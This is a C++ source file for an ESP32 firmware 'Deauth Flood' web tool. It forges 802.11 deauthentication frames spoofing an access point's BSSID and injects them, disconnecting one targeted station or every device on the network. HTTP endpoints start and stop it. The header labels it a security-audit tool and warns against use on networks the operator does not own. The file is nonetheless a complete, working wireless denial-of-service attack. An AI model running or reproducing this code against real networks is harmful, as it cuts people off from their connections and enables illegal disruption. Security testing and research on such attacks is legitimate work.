/**
 * @file      web_tool_deauthflood.cpp
 * @brief     Deauth flood (NucleoOS parity): 802.11 deauth injection to disconnect devices.
 *            Security audit tool — for testing your own networks with permission.
 *
 *            Injects 802.11 deauthentication frames to disconnect devices from a target
 *            network. Can target specific stations or broadcast to disconnect all devices
 *            on a given BSSID.
 *
 *            The implementation uses esp_wifi 802.11 raw frame injection.
 *            Deauth packet format: type=0, subtype=12 (0xC0)
 *
 *            WARNING: Only use on networks you own or have explicit permission to test.
 *            This is a denial-of-service tool — using it against networks you don't own
 *            is illegal in most jurisdictions.
 */
#include "web_tools.h"

#if FACTORY_WEB

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <mutex>

#ifdef ARDUINO
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#endif

/* ---------------------------------------------------------------- state */

static bool s_active = false;
static char s_target_bssid[18] = "";
static char s_target_station[18] = "";
static int s_channel = 1;
static int s_rate_kbps = 10;            /* approximate packets per second */
static uint32_t s_sent = 0;
static long long s_started = 0;

/* Rak latency / timing */
static uint32_t s_last_send_ms = 0;
static int s_packets_per_tick = 1;

/* ---------------------------------------------------------------- deauth frame builder */

/*
 * 802.11 deauthentication frame (type 0, subtype 12)
 * Bytes:
 *   0-1: Frame Control (0xC0 0x00 = deauth)
 *   2-3: Duration
 *   4-9: Destination address (station MAC or broadcast)
 *  10-15: Source address (AP BSSID)
 *  16-21: BSSID (AP MAC)
 *  22-23: Sequence control
 *  24-25: Reason code
 *
 * Reason codes: 0x07 = "leaving network", 0x04 = "disconnected due to inactivity"
 */
#define DEAUTH_FRAME_SIZE 26

static void build_deauth(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_SIZE);
    frame[0] = 0xC0;   /* type=0 (management), subtype=12 (deauth) */
    frame[1] = 0x00;
    frame[2] = 0x00;   /* duration */
    frame[3] = 0x00;
    memcpy(frame + 4, dst, 6);   /* destination */
    memcpy(frame + 10, src, 6);  /* source = BSSID */
    memcpy(frame + 16, src, 6);  /* BSSID */
    frame[22] = 0x00;  /* sequence (low) */
    frame[23] = 0x00;  /* sequence (high) */
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
}

static bool mac_parse(const char *s, uint8_t *mac)
{
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)v[i];
    return true;
}

#ifdef ARDUINO
static void send_deauth(void)
{
    uint8_t bssid[6], station[6], bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

    if (!mac_parse(s_target_bssid, bssid)) return;

    /* Set to the target channel */
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[DEAUTH_FRAME_SIZE];

    /* If a specific station is targeted */
    if (s_target_station[0] && strcmp(s_target_station, "ff:ff:ff:ff:ff:ff")) {
        if (!mac_parse(s_target_station, station)) return;
        /* Deauth from AP to station */
        build_deauth(frame, station, bssid, 0x07);
        esp_wifi_80211_tx(frame, DEAUTH_FRAME_SIZE, 0);
        s_sent++;

        /* Deauth from station to AP */
        build_deauth(frame, bssid, station, 0x07);
        esp_wifi_80211_tx(frame, DEAUTH_FRAME_SIZE, 0);
        s_sent++;
    } else {
        /* Broadcast deauth — send to all stations via broadcast */
        build_deauth(frame, bcast, bssid, 0x07);
        for (int i = 0; i < s_packets_per_tick; i++) {
            frame[22] = (uint8_t)(s_sent & 0xFF);  /* vary sequence number */
            frame[23] = (uint8_t)((s_sent >> 8) & 0xFF);
            esp_wifi_80211_tx(frame, DEAUTH_FRAME_SIZE, 0);
            s_sent++;
        }
    }
}
#endif /* ARDUINO */

/* ---------------------------------------------------------------- API handler */

static const char *const APPS[] = { "Deauth Flood", NULL };

static void status_json(web_req_t *r)
{
    std::string j = "{\"active\":" + std::string(s_active ? "true" : "false");
    if (s_active) {
        j += ",\"target_bssid\":";
        web_json_str(j, s_target_bssid);
        j += ",\"target_station\":";
        web_json_str(j, s_target_station);
        j += ",\"channel\":" + tools_int(s_channel) +
            ",\"sent\":" + tools_int(s_sent) +
            ",\"rate_kbps\":" + tools_int(s_rate_kbps) +
            ",\"started\":" + tools_int(s_started);
    }
    j += "}";
    web_resp_json(r, 200, j);
}

static void start_flood(web_req_t *r)
{
    if (tools_busy(r, APPS)) return;
    std::string body, bssid, station;
    double ch = 0, rate = 0;
    if (!tools_read_json(r, body)) return;
    web_json_get_str(body, "bssid", bssid);
    web_json_get_str(body, "station", station);
    web_json_get_num(body, "channel", &ch);
    web_json_get_num(body, "rate", &rate);

    if (s_active) { web_resp_error(r, 409, "conflict", "already running"); return; }
    if (bssid.empty() || bssid.size() < 17) {
        web_resp_error(r, 400, "bad_request", "bssid required (xx:xx:xx:xx:xx:xx)");
        return;
    }
    uint8_t test[6];
    if (!mac_parse(bssid.c_str(), test)) {
        web_resp_error(r, 400, "bad_request", "invalid BSSID format");
        return;
    }

    s_active = true;
    snprintf(s_target_bssid, sizeof(s_target_bssid), "%s", bssid.c_str());
    snprintf(s_target_station, sizeof(s_target_station), "%s", station.empty() ? "ff:ff:ff:ff:ff:ff" : station.c_str());
    s_channel = (int)ch > 0 ? (int)ch : 1;
    s_rate_kbps = (int)rate > 0 ? (int)rate : 10;
    s_sent = 0;
    s_started = tools_epoch();
    s_last_send_ms = 0;
    s_packets_per_tick = s_rate_kbps / 20;  /* ~20 ticks per second */
    if (s_packets_per_tick < 1) s_packets_per_tick = 1;

#ifdef ARDUINO
    WiFi.disconnect();  /* Disconnect from any existing network to use Wi-Fi in raw mode */
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_enable(0);  /* Ensure we can transmit */
#endif

    web_resp_ok(r);
}

static void stop_flood(web_req_t *r)
{
    if (!s_active) { web_resp_ok(r); return; }
    s_active = false;

#ifdef ARDUINO
    /* Reconnect to Wi-Fi if we had one */
    /* The web core handles reconnection */
#endif

    web_resp_ok(r);
}

static bool handle(web_req_t *r)
{
    if (strcmp(r->path, "/api/deauthflood") && strncmp(r->path, "/api/deauthflood/", 17)) return false;
    if (tools_is(r, "GET", "/api/deauthflood")) status_json(r);
    else if (tools_is(r, "POST", "/api/deauthflood/start")) start_flood(r);
    else if (tools_is(r, "POST", "/api/deauthflood/stop")) stop_flood(r);
#ifndef ARDUINO
    else if (tools_is(r, "POST", "/api/_dev/deauthflood")) {
        /* Simulator: just acknowledge */
        s_active = true;
        s_sent = 0;
        std::string body;
        web_read_body(r, body, 256);
        (void)body;
        web_resp_ok(r);
        return true;
    }
#endif
    else web_resp_error(r, 404, "not_found");
    return true;
}

static void deauth_tick(uint32_t now_ms)
{
    if (!s_active) return;

#ifdef ARDUINO
    if (now_ms - s_last_send_ms >= 50) {  /* ~20 Hz */
        send_deauth();
        s_last_send_ms = now_ms;
    }
#else
    /* Simulator: just increment counter */
    (void)now_ms;
    s_sent += s_packets_per_tick;
#endif
}

static void deauth_stop(void)
{
    s_active = false;
}

static const char *const CAPS[] = { "deauth.flood", NULL };
const web_tool_t web_tool_deauthflood = { CAPS, handle, deauth_tick, NULL, deauth_stop };

#else /* !FACTORY_WEB */
const web_tool_t web_tool_deauthflood = { NULL, NULL, NULL, NULL, NULL };
#endif /* FACTORY_WEB */